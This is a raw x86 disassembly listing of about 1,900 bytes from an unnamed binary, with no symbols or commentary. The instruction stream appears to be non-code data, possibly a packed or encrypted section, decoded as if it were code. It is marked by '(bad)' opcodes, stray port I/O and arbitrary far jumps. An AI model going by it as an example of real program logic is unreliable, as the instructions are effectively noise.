  410d31:	add    al,0x78
  410d33:	lock outs dx,DWORD PTR ds:[esi]
  410d35:	imul   edx,DWORD PTR [ebx+0x12],0xffffffbf
  410d39:	scas   al,BYTE PTR es:[edi]
  410d3a:	inc    ebx
  410d3b:	jb     0x410d15
  410d3d:	aas    
  410d3e:	xchg   edx,eax
  410d3f:	and    bh,BYTE PTR [ebp-0x34f6117]
  410d45:	jl     0x410d95
  410d47:	ds icebp 
  410d49:	leave  
  410d4a:	fcmovu st,st(1)
  410d4c:	jo     0x410dba
  410d4e:	adc    eax,0x1d503ce5
  410d53:	mov    al,0xe0
  410d55:	imul   ebx,DWORD PTR [esi+0x6ac6f017],0xef577fa1
  410d5f:	push   esp
  410d60:	aas    
  410d61:	sub    ebx,DWORD PTR [eax+0x29]
  410d64:	fist   DWORD PTR [bp+si+0x65]
  410d68:	cli    
  410d69:	and    edx,DWORD PTR [edi-0x1cd1abdb]
  410d6f:	and    ch,bh
  410d71:	test   BYTE PTR [edx],ah
  410d73:	retf   
  410d74:	aaa    
  410d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d76:	fwait
  410d77:	shl    BYTE PTR [eax],0xf2
  410d7a:	or     al,BYTE PTR [edi-0x1d71c839]
  410d80:	imul   edx,DWORD PTR [edx],0xfffffff6
  410d83:	(bad)  
  410d84:	data16 aad 0x54
  410d87:	adc    eax,0xf4acc887
  410d8c:	inc    esp
  410d8d:	outs   dx,BYTE PTR ds:[esi]
  410d8e:	cli    
  410d8f:	xor    eax,0xda9704a0
  410d94:	dec    edi
  410d95:	pop    ds
  410d96:	jmp    0xb43e:0x25b1e80f
  410d9d:	add    ebx,esp
  410d9f:	add    dh,al
  410da1:	push   eax
  410da2:	(bad)  
  410da3:	pop    eax
  410da4:	clc    
  410da5:	mov    ebx,0xe46e6f34
  410daa:	inc    ebx
  410dab:	mov    ds:0x5b71a0a1,al
  410db0:	and    al,0x79
  410db2:	mov    gs,ebp
  410db4:	mov    esp,0x778ff527
  410db9:	mov    ds:0xe8cf6985,eax
  410dbe:	add    bl,0xd5
  410dc1:	es clc 
  410dc3:	xchg   esp,eax
  410dc4:	lods   al,BYTE PTR ds:[esi]
  410dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dc6:	mov    al,ds:0xdfeef171
  410dcb:	inc    edx
  410dcc:	and    eax,0xccfc96f0
  410dd1:	test   BYTE PTR [edx+0x12],0x92
  410dd5:	mov    cl,0x98
  410dd7:	call   0xc5d3:0xebab1bbb
  410dde:	popf   
  410ddf:	stos   DWORD PTR es:[edi],eax
  410de0:	or     dl,BYTE PTR [eax]
  410de2:	fdivp  st(2),st
  410de4:	adc    DWORD PTR [ecx],esi
  410de6:	mov    ds:0x973a969d,al
  410deb:	jge    0x410e0f
  410ded:	rcr    BYTE PTR [edx+0x42],cl
  410df0:	ret    0xd8b6
  410df3:	dec    ecx
  410df4:	adc    ah,BYTE PTR [ebx-0x67bb9b0b]
  410dfa:	pop    ebx
  410dfb:	xor    ecx,esp
  410dfd:	mov    ebp,0x2f0ac090
  410e02:	jb     0x410db2
  410e04:	clc    
  410e05:	add    eax,0x8fa50656
  410e0a:	out    dx,eax
  410e0b:	and    ah,bh
  410e0d:	in     al,dx
  410e0e:	jns    0x410da4
  410e10:	addr16 jns 0x410e27
  410e13:	inc    ebx
  410e14:	jne    0x410e5a
  410e16:	lock cli 
  410e18:	push   ss
  410e19:	(bad)  
  410e1a:	pushf  
  410e1b:	inc    esi
  410e1c:	pop    ebx
  410e1d:	int3   
  410e1e:	add    dh,BYTE PTR [ecx+0x9]
  410e21:	or     esp,DWORD PTR [edi+ebp*8+0x1ffcf5e0]
  410e28:	sbb    BYTE PTR [edi],dl
  410e2a:	pop    ebx
  410e2b:	mov    bl,0x44
  410e2d:	mov    dl,BYTE PTR [esi-0x4afd8475]
  410e33:	sbb    dl,al
  410e35:	pop    es
  410e36:	call   0x9627da98
  410e3b:	jecxz  0x410e8d
  410e3d:	adc    al,0x78
  410e3f:	mov    ?,WORD PTR [edi-0x46]
  410e42:	push   esp
  410e43:	retf   
  410e44:	aam    0x93
  410e46:	imul   BYTE PTR [eax+0x423e9fc9]
  410e4c:	pmulhuw mm6,QWORD PTR [eax-0x3a]
  410e50:	adc    DWORD PTR ds:0xeb33c048,0x6f
  410e57:	sbb    al,0x61
  410e59:	cmp    DWORD PTR [eax+ecx*4],ebx
  410e5c:	bound  ecx,QWORD PTR [eax]
  410e5e:	ret    0x73f7
  410e61:	ins    DWORD PTR es:[edi],dx
  410e62:	xor    DWORD PTR [ecx],edx
  410e64:	(bad)  
  410e65:	mov    ?,ecx
  410e67:	(bad)  
  410e68:	dec    edx
  410e69:	jns    0x410ea1
  410e6b:	dec    edi
  410e6c:	xchg   ebx,eax
  410e6d:	push   esi
  410e6e:	test   DWORD PTR [ebx+ebx*8],esp
  410e71:	pop    ebx
  410e72:	fstp   DWORD PTR [ecx+0x5da85bcf]
  410e78:	(bad)  
  410e79:	(bad)  
  410e7a:	dec    ecx
  410e7b:	out    dx,eax
  410e7c:	loopne 0x410e2d
  410e7e:	cli    
  410e7f:	sub    BYTE PTR [ebp-0x77f66aee],0xaf
  410e86:	clc    
  410e87:	aam    0xf4
  410e89:	pop    esi
  410e8a:	sbb    bl,BYTE PTR [edi+0x1d6701fc]
  410e90:	stos   BYTE PTR es:[edi],al
  410e91:	aam    0x15
  410e93:	mov    DWORD PTR [esi+ebx*4],esi
  410e96:	pusha  
  410e97:	ret    
  410e98:	inc    esi
  410e99:	ins    BYTE PTR es:[edi],dx
  410e9a:	push   esi
  410e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e9c:	jmp    0xe96:0xf1ff50a5
  410ea3:	push   ss
  410ea4:	push   eax
  410ea5:	pop    ds
  410ea6:	nop    ebp
  410ea9:	pop    ecx
  410eaa:	mov    cl,0x4
  410eac:	xor    DWORD PTR [eax],0x95820fe2
  410eb2:	ins    DWORD PTR es:[edi],dx
  410eb3:	mov    dh,0xf9
  410eb5:	pop    es
  410eb6:	adc    BYTE PTR [ebp+edx*8+0x7f],dl
  410eba:	sbb    eax,0xa327264e
  410ebf:	push   0x20a47a15
  410ec4:	add    cl,BYTE PTR [ebp+0x795bba8b]
  410eca:	push   ebx
  410ecb:	add    eax,0x47cf2f95
  410ed0:	retf   0xfa75
  410ed3:	adc    BYTE PTR [edx+0x7a],ch
  410ed6:	pop    ecx
  410ed7:	fcmovu st,st(6)
  410ed9:	sbb    bh,BYTE PTR [ecx+ecx*2+0x70]
  410edd:	js     0x410f33
  410edf:	or     al,0x3c
  410ee1:	ins    BYTE PTR es:[edi],dx
  410ee2:	and    al,0xcf
  410ee4:	xchg   ecx,eax
  410ee5:	inc    ebx
  410ee6:	push   edi
  410ee7:	call   0xb799d4c
  410eec:	dec    eax
  410eed:	(bad)  
  410eee:	mov    WORD PTR [ecx+0x76291fe5],ds
  410ef4:	into   
  410ef5:	das    
  410ef6:	mov    eax,ebx
  410ef8:	lods   eax,DWORD PTR ds:[esi]
  410ef9:	cld    
  410efa:	fidivr WORD PTR [edi+0xd7b1739]
  410f00:	or     esi,DWORD PTR [esi+esi*4]
  410f03:	inc    eax
  410f04:	fiadd  DWORD PTR [ecx+0x1e]
  410f07:	cmp    BYTE PTR [edi+0x23336f8f],bh
  410f0d:	cld    
  410f0e:	sahf   
  410f0f:	je     0x410f87
  410f11:	mov    ds:0xea2851a8,eax
  410f16:	enter  0x5291,0x96
  410f1a:	fnstenv [edi+0x30]
  410f1d:	jne    0x410efc
  410f1f:	mov    al,0x34
  410f21:	arpl   WORD PTR [esi],dx
  410f23:	mov    dl,0x80
  410f25:	imul   edi,DWORD PTR [edx],0xffffffa7
  410f28:	jb     0x410ebf
  410f2a:	and    DWORD PTR [esi+ebp*1+0x7735bfc1],ecx
  410f31:	adc    DWORD PTR [esi-0x6bad8c7c],edi
  410f37:	fwait
  410f38:	mov    dh,0x28
  410f3a:	sbb    ah,al
  410f3c:	ins    BYTE PTR es:[edi],dx
  410f3d:	pop    ebp
  410f3e:	jmp    0xb058492d
  410f43:	fwait
  410f44:	sbb    al,0x37
  410f46:	out    0xfa,al
  410f48:	lea    eax,[ecx+ecx*1]
  410f4b:	fadd   QWORD PTR [ecx-0x1ad59db2]
  410f51:	ret    
  410f52:	dec    ebx
  410f53:	mov    cl,0x23
  410f55:	repnz lahf 
  410f57:	push   edx
  410f58:	cmp    BYTE PTR [eax+0x7e],bh
  410f5b:	pinsrw mm1,WORD PTR [ebp-0x47],0x93
  410f60:	(bad)  
  410f61:	cmp    eax,0x771b60a5
  410f66:	int3   
  410f67:	pop    es
  410f68:	mov    cl,0x39
  410f6a:	aam    0xd
  410f6c:	leave  
  410f6d:	cmp    BYTE PTR [eax],ah
  410f6f:	jnp    0x410f94
  410f71:	mov    BYTE PTR [eax+ecx*8-0x70f21799],dl
  410f78:	test   eax,ebp
  410f7a:	jmp    0x410f3b
  410f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f7d:	add    al,0x48
  410f7f:	test   edi,ebx
  410f81:	call   0x14c1:0xd704fa1e
  410f88:	ror    DWORD PTR [esi-0x17],1
  410f8b:	dec    eax
  410f8c:	mov    DWORD PTR [esi+0x10],ebp
  410f8f:	test   BYTE PTR [ecx+ecx*2+0x7d3f0399],bl
  410f96:	sbb    dl,al
  410f98:	add    eax,DWORD PTR [eax-0x62]
  410f9b:	cmp    eax,0x8d4d7fef
  410fa0:	test   esi,edx
  410fa2:	mov    WORD PTR [eax-0x3c],?
  410fa5:	(bad)  
  410fa6:	sbb    BYTE PTR [edx+edx*1],dh
  410fa9:	add    al,0xee
  410fab:	aad    0x3c
  410fad:	push   es
  410fae:	fdivr  st(0),st
  410fb0:	pop    ebp
  410fb1:	xchg   DWORD PTR [edx+ebx*8-0x4db02b06],ecx
  410fb8:	add    BYTE PTR [esi+0x3401ea86],0xdc
  410fbf:	in     eax,0xb7
  410fc1:	arpl   WORD PTR [eax],di
  410fc3:	int3   
  410fc4:	iret   
  410fc5:	leave  
  410fc6:	stc    
  410fc7:	call   esp
  410fc9:	stc    
  410fca:	inc    esi
  410fcb:	mov    BYTE PTR [ebx],ch
  410fcd:	fs xchg ebp,eax
  410fcf:	js     0x410f5d
  410fd1:	xchg   ebx,eax
  410fd2:	xchg   BYTE PTR [ebp+0x7e],bl
  410fd5:	add    bh,bl
  410fd7:	retf   0xba31
  410fda:	dec    ecx
  410fdb:	call   0x21d7:0x1e9c7755
  410fe2:	push   eax
  410fe3:	adc    al,0xee
  410fe5:	xchg   edx,eax
  410fe6:	or     dh,dl
  410fe8:	xchg   DWORD PTR [eax],esp
  410fea:	jl     0x411014
  410fec:	in     eax,0xe
  410fee:	js     0x411036
  410ff0:	(bad)  
  410ff1:	xlat   BYTE PTR ds:[ebx]
  410ff2:	ret    
  410ff3:	retf   0xe73b
  410ff6:	pop    ecx
  410ff7:	pop    edx
  410ff8:	xor    al,0x6c
  410ffa:	mov    edx,0xd6490ee3
  410fff:	mov    al,BYTE PTR [edi-0x3c]
  411002:	scas   eax,DWORD PTR es:[edi]
  411003:	imul   ecx,DWORD PTR [edx],0xfffffff2
  411006:	jl     0x41106a
  411008:	add    al,0xf0
  41100a:	jns    0x410ff8
  41100c:	push   es
  41100d:	cmp    al,0x94
  41100f:	xchg   ebx,eax
  411010:	sbb    BYTE PTR [ecx-0x4e],dh
  411013:	pop    edi
  411014:	mov    ebx,0x3ee1a696
  411019:	xor    al,0x91
  41101b:	call   FWORD PTR [ebx]
  41101d:	scas   al,BYTE PTR es:[edi]
  41101e:	into   
  41101f:	aaa    
  411020:	mov    ds:0xa8fc498d,al
  411025:	mov    eax,ds:0xdd07c0a1
  41102a:	and    eax,0xb2f07b21
  41102f:	mov    ebx,0xfb53d108
  411034:	cli    
  411035:	arpl   bp,bp
  411037:	pop    esi
  411038:	(bad)  
  411039:	je     0x4110ba
  41103b:	or     al,0xec
  41103d:	call   0x37a4:0x9c2d4dd0
  411044:	clc    
  411045:	sub    al,0x30
  411047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411048:	fisub  DWORD PTR [edx+ecx*1-0x3651851]
  41104f:	xchg   cl,dl
  411051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411052:	add    esp,DWORD PTR [ecx+esi*2-0x57]
  411056:	jecxz  0x411033
  411058:	imul   ecx,ebx,0xffffffe4
  41105b:	popf   
  41105c:	cmp    DWORD PTR [esi],eax
  41105e:	pop    ss
  41105f:	cmp    esi,DWORD PTR [esi-0x48aacdfd]
  411065:	in     eax,0xc5
  411067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411068:	neg    DWORD PTR [ebx+0x3e9e087b]
  41106e:	xlat   BYTE PTR ds:[ebx]
  41106f:	pop    ds
  411070:	loope  0x4110ed
  411072:	jle    0x411001
  411074:	and    al,0x82
  411076:	or     eax,ebp
  411078:	jg     0x411012
  41107a:	pop    es
  41107b:	(bad)  
  41107c:	shr    DWORD PTR [eax],cl
  41107e:	shr    DWORD PTR [esi],1
  411080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411081:	lds    esp,FWORD PTR [esi+ebx*1]
  411084:	push   ds
  411085:	das    
  411086:	jnp    0x4110fc
  411088:	add    ecx,esi
  41108a:	imul   edx,eax,0x5c
  41108d:	sbb    al,0x3f
  41108f:	ss lahf 
  411091:	aad    0x8a
  411093:	in     eax,0xdf
  411095:	addr16 xchg esi,eax
  411097:	out    dx,eax
  411098:	cmp    ebp,ebp
  41109a:	std    
  41109b:	mov    bh,0x6b
  41109d:	(bad)  
  41109e:	push   esi
  41109f:	stc    
  4110a0:	dec    esi
  4110a1:	mov    ds:0x8f00ebf3,eax
  4110a6:	aad    0x8a
  4110a8:	mov    ebp,0x83957f95
  4110ad:	leave  
  4110ae:	in     al,dx
  4110af:	mov    ds:0xa5c8698b,eax
  4110b4:	lahf   
  4110b5:	inc    eax
  4110b6:	cwde   
  4110b7:	mov    edx,0x90458b2d
  4110bc:	mov    al,ds:0x62061774
  4110c1:	popf   
  4110c2:	lahf   
  4110c3:	sbb    eax,0x5312d8bf
  4110c8:	or     eax,0x427c782c
  4110cd:	or     ah,BYTE PTR ds:0x6c08240c
  4110d3:	mov    eax,0x6d1fa9fc
  4110d8:	mov    ebx,0xe9233a43
  4110dd:	inc    eax
  4110de:	push   ebp
  4110df:	sub    bl,BYTE PTR [eax+ebp*1]
  4110e2:	ror    BYTE PTR [eax+0x5375145b],1
  4110e8:	stc    
  4110e9:	cmp    edx,ebp
  4110eb:	or     DWORD PTR [esi+0x16f15783],edx
  4110f1:	pop    ecx
  4110f2:	jg     0x4110ec
  4110f4:	mov    DWORD PTR [esi],edi
  4110f6:	ds loop 0x41110a
  4110f9:	and    esp,ebp
  4110fb:	sbb    eax,0xedf62698
  411100:	xlat   BYTE PTR ds:[ebx]
  411101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411102:	leave  
  411103:	xlat   BYTE PTR ds:[ebx]
  411104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411105:	and    bl,BYTE PTR [edx+0x1d97ef4e]
  41110b:	fistp  QWORD PTR [edi]
  41110d:	cmp    al,al
  41110f:	push   es
  411110:	or     eax,0x51b0acb3
  411115:	fbld   TBYTE PTR [ebx]
  411117:	(bad)  
  411118:	dec    esp
  411119:	icebp  
  41111a:	push   eax
  41111b:	ror    DWORD PTR [eax],1
  41111d:	mov    eax,0xad974b9d
  411122:	jo     0x4110d8
  411124:	inc    ecx
  411125:	or     DWORD PTR [eax],ebp
  411127:	sub    eax,0xa6a8ddfe
  41112c:	mov    bh,0xac
  41112e:	push   esi
  41112f:	dec    esi
  411130:	mov    edx,0x90867813
  411135:	in     eax,dx
  411136:	xchg   ebx,eax
  411137:	sbb    eax,0xb48836ca
  41113c:	mov    ebp,DWORD PTR [ebp+0x1fa8521d]
  411142:	add    DWORD PTR [ebx-0x1e],ecx
  411145:	sti    
  411146:	shl    esp,1
  411148:	pop    ebp
  411149:	push   ds
  41114a:	push   edx
  41114b:	stos   BYTE PTR es:[edi],al
  41114c:	stos   DWORD PTR es:[edi],eax
  41114d:	imul   ebx,DWORD PTR [eax+0x6d],0x7d9675eb
  411154:	add    eax,0x2999620
  411159:	xchg   ecx,eax
  41115a:	and    al,0xc3
  41115c:	popf   
  41115d:	pop    esp
  41115e:	shl    DWORD PTR [ebp+0x23],1
  411161:	jecxz  0x4111b8
  411163:	fdivr  DWORD PTR [edi+0x37]
  411166:	int3   
  411167:	sar    BYTE PTR [ecx+0x32173a42],1
  41116d:	sar    DWORD PTR [eax+edx*1],0x54
  411171:	mov    al,ds:0x69b738e5
  411176:	cmp    ch,BYTE PTR [ebx]
  411178:	popa   
  411179:	jge    0x411103
  41117b:	lods   al,BYTE PTR ds:[esi]
  41117c:	push   ebx
  41117d:	scas   al,BYTE PTR es:[edi]
  41117e:	adc    BYTE PTR [ebx+0x7],0x10
  411182:	cwde   
  411183:	add    DWORD PTR [ecx-0x47eb097b],ebx
  411189:	pushf  
  41118a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41118b:	test   eax,0x9afddd05
  411190:	dec    edi
  411191:	jae    0x411207
  411193:	xchg   esp,eax
  411194:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411196:	arpl   WORD PTR [ebx+0x1244542e],bp
  41119c:	inc    ebx
  41119d:	loopne 0x4111a2
  41119f:	bound  esp,QWORD PTR [esi-0x43c3af8b]
  4111a5:	fsub   st(1),st
  4111a7:	les    edi,FWORD PTR [ebp+0x67]
  4111aa:	xor    edi,DWORD PTR [eax+0x2c]
  4111ad:	lods   eax,DWORD PTR ds:[esi]
  4111ae:	(bad)  [edx+0x4d]
  4111b1:	aaa    
  4111b2:	aaa    
  4111b3:	cmc    
  4111b4:	pushf  
  4111b5:	mov    DWORD PTR [ebp-0x4724069f],ebp
  4111bb:	rcl    BYTE PTR [esi],cl
  4111bd:	sti    
  4111be:	push   esp
  4111bf:	jbe    0x41115c
  4111c1:	or     ecx,DWORD PTR [ebp+eax*2-0x17f3476b]
  4111c8:	xchg   ebx,eax
  4111c9:	adc    al,0xb7
  4111cb:	xlat   BYTE PTR ds:[ebx]
  4111cc:	and    eax,0x2518d354
  4111d1:	fwait
  4111d2:	daa    
  4111d3:	push   ebp
  4111d4:	or     al,0xb7
  4111d6:	mov    ebx,edi
  4111d8:	retf   0x8f32
  4111db:	out    dx,al
  4111dc:	popf   
  4111dd:	or     al,0x38
  4111df:	call   DWORD PTR [eax+0x71]
  4111e2:	lods   eax,DWORD PTR ds:[esi]
  4111e3:	xchg   BYTE PTR [esi],dh
  4111e5:	fdiv   QWORD PTR [ecx]
  4111e7:	inc    esp
  4111e8:	cli    
  4111e9:	(bad)  
  4111ea:	adc    BYTE PTR [ebx-0x639397e8],0xab
  4111f1:	in     al,dx
  4111f2:	mov    bh,0x61
  4111f4:	pop    ebp
  4111f5:	les    eax,FWORD PTR [esi]
  4111f7:	sahf   
  4111f8:	int    0xa8
  4111fa:	mov    BYTE PTR [esi+0x22],al
  4111fd:	outs   dx,BYTE PTR ds:[esi]
  4111fe:	fisubr WORD PTR [ecx+0x4d]
  411201:	mov    BYTE PTR [ecx],bh
  411203:	pop    ds
  411204:	(bad)  
  411207:	and    ecx,DWORD PTR [esi+edx*4]
  41120a:	cmp    eax,0xa816155e
  41120f:	xchg   edi,eax
  411210:	(bad)  
  411212:	mov    dh,0x19
  411214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411215:	adc    DWORD PTR [esi+0x12331c3c],edi
  41121b:	and    ebp,DWORD PTR [ebx+0x3889a8aa]
  411221:	rol    BYTE PTR [eax-0x74],0x51
  411225:	sti    
  411226:	mov    bp,0x63cc
  41122a:	or     al,0xf
  41122d:	mov    dl,0xd9
  41122f:	aaa    
  411230:	ret    0xd2d2
  411233:	int3   
  411234:	dec    esp
  411235:	stos   BYTE PTR es:[edi],al
  411236:	jo     0x411238
  411238:	sbb    al,bh
  41123a:	imul   edi,esp,0x1066c025
  411240:	xor    esi,eax
  411242:	pop    ebp
  411243:	mov    dh,BYTE PTR [esi+edi*4-0x12328637]
  41124a:	adc    eax,0x11137fd1
  41124f:	add    dh,BYTE PTR [edi-0x2a739199]
  411255:	xor    cl,BYTE PTR [eax+0x3b]
  411258:	dec    esi
  411259:	dec    ebx
  41125a:	out    dx,eax
  41125b:	aam    0x42
  41125d:	fnstsw WORD PTR [edx]
  41125f:	cmp    dl,BYTE PTR [edx+0x7dd16676]
  411265:	cmp    DWORD PTR [eax-0x91f6ba],ebp
  41126b:	arpl   WORD PTR [eax-0x70],di
  41126e:	and    DWORD PTR ds:0x20bf9818,0x53af4ba5
  411278:	jp     0x411236
  41127a:	jno    0x4112b7
  41127c:	and    eax,0x66fe880a
  411281:	mov    cl,0x39
  411283:	mov    dh,0xe7
  411285:	loopne 0x4112ad
  411287:	test   esi,edi
  411289:	dec    esi
  41128a:	icebp  
  41128b:	lock cld 
  41128d:	mov    al,0x20
  41128f:	pop    ecx
  411290:	and    BYTE PTR [esi-0x30e92751],cl
  411296:	outs   dx,DWORD PTR ds:[esi]
  411297:	xchg   esi,eax
  411298:	(bad)  
  411299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41129a:	stc    
  41129b:	imul   ecx,DWORD PTR [edx+0x1b3f5ebd],0xb
  4112a2:	mov    esp,0x1e788126
  4112a7:	xchg   BYTE PTR [edi],ah
  4112a9:	out    dx,eax
  4112aa:	mov    ds:0xb55fce1,eax
  4112af:	cmp    esp,DWORD PTR [ebx]
  4112b1:	push   edi
  4112b2:	fxch   st(1)
  4112b4:	das    
  4112b5:	xchg   BYTE PTR ds:0x683d5958,cl
  4112bb:	mov    bl,0x91
  4112bd:	imul   esi,DWORD PTR [ebx-0x2c23086d],0x14
  4112c4:	lds    edi,FWORD PTR es:[ebx-0x4e]
  4112c8:	cmp    cl,bl
  4112ca:	test   eax,0x71c26b61
  4112cf:	adc    esp,0x35561907
  4112d5:	in     eax,0x8
  4112d7:	mov    ebp,0x8760c43c
  4112dc:	jno    0x411284
  4112de:	add    DWORD PTR [ebx+0x7c],eax
  4112e1:	xor    eax,0x3138cfdf
  4112e6:	fwait
  4112e7:	mov    edx,0x5549401a
  4112ec:	les    ebp,FWORD PTR [esi]
  4112ee:	out    0xdd,eax
  4112f0:	mov    ecx,0x9b66371b
  4112f5:	mov    edx,0xf5c73bba
  4112fa:	aas    
  4112fb:	push   0x1d
  4112fd:	pop    eax
  4112fe:	push   0xde7d9744
  411303:	pop    edi
  411304:	(bad)
  411308:	sar    BYTE PTR [ecx+ecx*1-0x31],0xd0
  41130d:	loope  0x411363
  41130f:	clc    
  411310:	pop    eax
  411311:	jbe    0x411357
  411313:	sbb    bl,BYTE PTR [ebx+0x4c]
  411316:	pop    esp
  411317:	cs mov edx,eax
  41131a:	ss rcl bh,1
  41131d:	mov    eax,ds:0x3fe9cdb6
  411322:	lods   al,BYTE PTR ds:[esi]
  411323:	adc    al,BYTE PTR [esi+0x77eea036]
  411329:	fld    TBYTE PTR [ebx-0x5]
  41132c:	adc    BYTE PTR [edx],dl
  41132e:	push   eax
  41132f:	into   
  411330:	xor    dl,dh
  411332:	inc    ebp
  411333:	mov    esp,DWORD PTR [edi]
  411335:	jb     0x41135f
  411337:	push   ebx
  411338:	sbb    eax,0x2dbbaef3
  41133d:	(bad)
  411341:	add    al,0x7e
  411343:	ds mov ch,0xa2
  411346:	scas   al,BYTE PTR es:[edi]
  411347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411348:	xor    DWORD PTR [ebx+0xd16a6fc],ebp
  41134e:	push   edi
  41134f:	push   es
  411350:	add    ah,BYTE PTR [esp+ebx*4]
  411353:	pusha  
  411354:	cli    
  411355:	pop    ecx
  411356:	and    ebx,DWORD PTR [esi-0x59cd7bec]
  41135c:	mov    dl,0xa3
  41135e:	mov    ch,0xd2
  411360:	pop    ebx
  411361:	add    esp,edi
  411363:	dec    ebp
  411364:	loope  0x411309
  411366:	mov    ss,WORD PTR [eax+0x1c]
  411369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41136a:	sbb    BYTE PTR [eax+0x7f00c08a],0xa2
  411371:	push   ebp
  411372:	sub    DWORD PTR [ecx+ecx*8+0x49882682],ebx
  411379:	adc    ah,0xc8
  41137c:	xchg   ebp,eax
  41137d:	xchg   ebp,eax
  41137e:	out    dx,eax
  41137f:	mov    ecx,0xa9908815
  411384:	sti    
  411385:	jns    0x4113a4
  411387:	pop    ebp
  411388:	pop    ecx
  411389:	add    ebx,esp
  41138b:	or     ah,BYTE PTR [eax+ecx*2-0x1d62cd47]
  411392:	add    al,0x78
  411394:	stos   BYTE PTR es:[edi],al
  411395:	cmp    eax,DWORD PTR [esi+0x8]
  411398:	(bad)  
  411399:	mov    eax,0x58f7097a
  41139e:	pop    ds
  41139f:	push   0x5aa84013
  4113a4:	push   esi
  4113a5:	and    edi,DWORD PTR ss:[eax+esi*2]
  4113a9:	ret    
  4113aa:	adc    eax,0x32106d9b
  4113af:	repnz addr16 add al,0xee
  4113b3:	int    0x7d
  4113b5:	mov    BYTE PTR [esi-0x53],dl
  4113b8:	das    
  4113b9:	or     BYTE PTR [edx+esi*4-0x97d1836],cl
  4113c0:	cli    
  4113c1:	jg     0x411429
  4113c3:	sub    esi,DWORD PTR [esi]
  4113c5:	jo     0x411392
  4113c7:	clc    
  4113c8:	in     eax,0xfd
  4113ca:	sub    DWORD PTR [edi],eax
  4113cc:	pop    esp
  4113cd:	shr    BYTE PTR [ecx],1
  4113cf:	jbe    0x4113fc
  4113d1:	aam    0xbb
  4113d3:	loope  0x4113da
  4113d5:	mov    ebx,DWORD PTR [ebp-0x57d793db]
  4113db:	xor    al,0x82
  4113dd:	jecxz  0x411429
  4113df:	enter  0x9c3d,0x52
  4113e3:	pop    esp
  4113e4:	jns    0x411450
  4113e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113e7:	enter  0x5131,0x5a
  4113eb:	frstor [edx+ebx*4+0x7d]
  4113ef:	push   esi
  4113f0:	sbb    eax,0xeb09e6ed
  4113f5:	or     edx,ebx
  4113f7:	and    BYTE PTR [esi+edx*2-0x7f],bl
  4113fb:	ret    0x77ea
  4113fe:	mov    ah,0xa1
  411400:	test   BYTE PTR [ebp-0x2],ah
  411403:	sbb    DWORD PTR [esi],esi
  411405:	(bad)  
  411406:	cmp    ecx,esp
  411408:	jnp    0x4113ba
  41140a:	mov    BYTE PTR [edx-0x6bf39590],ch
  411410:	in     eax,0xcc
  411412:	(bad)  
  411413:	pop    edi
  411414:	loop   0x4113c9
  411416:	in     eax,dx
  411417:	in     al,0x7f
  411419:	test   cl,dh
  41141b:	ss or  eax,esp
  41141e:	inc    edi
  41141f:	adc    ebx,DWORD PTR fs:[esi+0x2]
  411423:	in     al,dx
  411424:	pop    es
  411425:	rol    BYTE PTR [ebp+0x40],cl
  411428:	test   DWORD PTR [edx+eiz*1],ecx
  41142b:	adc    edi,esp
  41142d:	aad    0x1b
  41142f:	sti    
  411430:	clc    
  411431:	scas   al,BYTE PTR es:[edi]
  411432:	lea    esp,[eax+0x7936aefb]
  411438:	sub    BYTE PTR [edx],dl
  41143a:	jmp    0x150550f6
  41143f:	xchg   edx,eax
  411440:	out    0xc7,al
  411442:	pop    edx
  411443:	push   edi
  411444:	xor    eax,0x3bd9f522
  411449:	cli    
  41144a:	fucomp st(0)
  41144c:	cdq    
  41144d:	and    ebp,edx
  41144f:	out    0x8c,al
  411451:	xchg   ebp,eax
  411452:	ins    DWORD PTR es:[edi],dx
  411453:	mov    esp,DWORD PTR [esi]
  411455:	shr    ecx,0x6b
  411458:	fistp  WORD PTR [esi]
  41145a:	mov    eax,gs
  41145c:	sbb    DWORD PTR [ecx],ebx
  41145e:	daa    
  41145f:	sub    bl,ah
  411461:	xor    esi,DWORD PTR [ebp-0x32]
  411464:	push   ss
  411465:	mov    eax,ds:0xdd48f327
  41146a:	ds ins DWORD PTR es:[edi],dx
  41146c:	sahf   
  41146d:	fdiv   QWORD PTR [ecx-0x491c0d16]
  411473:	outs   dx,BYTE PTR ds:[esi]
  411474:	stos   DWORD PTR es:[edi],eax
  411475:	lea    esi,[edx+0xd]
  411478:	fild   QWORD PTR [ebp-0x4c]
  41147b:	js     0x411488
  41147d:	dec    ebp
  41147e:	mov    edx,0xcd61b865
  411483:	dec    ebp
  411484:	mov    dh,0x2a
  411486:	pop    ebx
  411487:	or     edx,DWORD PTR [ecx+0x75869eca]
  41148d:	or     BYTE PTR cs:[ebp+edi*2-0x6c],ch
  411492:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411494:	fnstenv [ebx]
  411496:	pop    ecx
  411497:	ficom  DWORD PTR [ecx]
  411499:	ins    DWORD PTR es:[edi],dx
  41149a:	inc    ecx
  41149b:	loope  0x4114dc
  41149d:	inc    ecx
  41149e:	mov    esi,DWORD PTR [edi+0x4d4fa777]
  4114a4:	clc    
  4114a5:	(bad)  
  4114a6:	adc    eax,0x97bd5b11
  4114ab:	jmp    0x11d7c5aa
  4114b0:	jo     0x41147d
  4114b2:	fistp  WORD PTR [ebx-0x61772f0c]
  4114b8:	fwait
  4114b9:	sub    BYTE PTR [eax-0x5f7e8332],dh
  4114bf:	pop    eax
  4114c0:	or     dl,dh
  4114c2:	jo     0x411470
  4114c4:	(bad)  
  4114c5:	fisub  WORD PTR [ecx]
  4114c7:	sub    eax,0xe5f7ebab
  4114cc:	inc    edx
